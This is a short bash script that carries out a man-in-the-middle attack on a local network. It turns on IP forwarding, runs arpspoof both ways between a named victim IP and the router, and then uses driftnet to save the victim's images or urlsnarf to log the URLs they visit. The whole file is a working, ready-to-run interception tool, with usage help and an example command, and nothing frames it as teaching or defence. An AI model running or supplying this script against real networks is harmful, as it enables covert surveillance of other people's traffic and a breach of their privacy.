#!/bin/bash

help() {
  echo "Perform Man in the Middle attack"
  echo ""
  echo "Usage: ./mitm_attact [net] [target_ip] [router_ip] [attact_option]"
  echo "[net] -- network interface name"
  echo "[target_ip] -- IP of the victim"
  echo "[router_ip] -- IP of the router (see: ip route show)"
  echo "[attact_option] -- use 'd' for driftnet, 'u' for urlsnarf"
  echo ""
  echo "Example: ./mitm_attact eth0 192.168.0.10 192.168.0.1 d"
}

if [ "$#" -ne 4 ]; then
  echo "Illegal number of parameters"
  echo ""
  help
  exit 0  
fi

net=$1
target_ip=$2
router_ip=$3
attact_option=$4

# 1. enable packet forwarding
sudo sysctl -w  net.ipv4.ip_forward=1
sudo sysctl -w  net.ipv6.conf.all.forwarding=1

# 2. intercept packages from victim
sudo arpspoof -i $net -t $target_ip $router_ip 2> /dev/null 1> /dev/null &
pid1=$!
echo $pid1

# 3.
sudo arpspoof -i $net -t $router_ip $target_ip 2> /dev/null 1> /dev/null &
pid2=$!
echo $pid2

# 4. driftnet or urlsnarf
if [ $attact_option == "d" ]; then
  sudo driftnet -d target_images/ -i $net 
elif [ $attact_option == "u" ]; then
  sudo urlsnarf -i $net
else
  echo "Wrong attact option. Exitting..."
fi

__cleanup ()
{
  # 5. Disable packet forwarding
  sudo sysctl -w  net.ipv4.ip_forward=0
  sudo sysctl -w  net.ipv6.conf.all.forwarding=0

  # Cleanup
  sudo kill -9 $pid1
  sudo kill -9 $pid2
}

trap __cleanup INT

